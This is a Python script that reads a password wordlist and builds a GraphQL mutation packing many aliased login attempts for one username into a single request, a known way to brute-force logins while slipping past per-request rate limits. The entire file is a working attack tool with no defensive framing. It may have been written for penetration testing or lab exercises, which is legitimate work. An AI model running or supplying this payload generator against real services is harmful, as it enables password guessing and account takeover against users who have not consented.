import sys
import argparse

def file_to_line_array(file_path):
    lines = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        # Remove endline chars
        lines = [line.strip() for line in lines]
    except FileNotFoundError:
        print(f"Not found file: {file_path}.")
    except Exception as e:
        print(f"Error reading file: {e}")
    return lines

def create_payload(lines, user):
    header= 'mutation {'
    footer= '}'
    repeater = 'alias{}:login(input:{{ username: \\"{}\\", password:\\"{}\\"}}){{token success}}'
    payload = header
    counter = 0

    for line in lines:
        payload += repeater.format(counter, user, line)
        counter+=1

    payload += footer
    return payload


def main():
    # Argument parser
    parser = argparse.ArgumentParser(description='Process a dictionary and an username')
    parser.add_argument('file_path', type=str, help='Path to the dictionary.')
    parser.add_argument('username', type=str, help='username.')
    parser.add_argument('--output', type=str, default=None, help='Optional output file.')

    args = parser.parse_args()

    # Get lines from dictionary
    lines = file_to_line_array(args.file_path)

    # Print username and total lines.
    print(f"Username: {args.username}")
    print("Wordlist count: {}".format(len(lines)))

    payload = create_payload(lines, args.username)

    if args.output:
        try:
            with open(args.output, 'w', encoding='utf-8') as file:
                file.write(payload)
                print(f"Created payload was saved in: {args.output}")
        except Exception as e:
            print(f"Error creating file: {e}")
    else:
        print(payload)

if __name__ == '__main__':
    main()



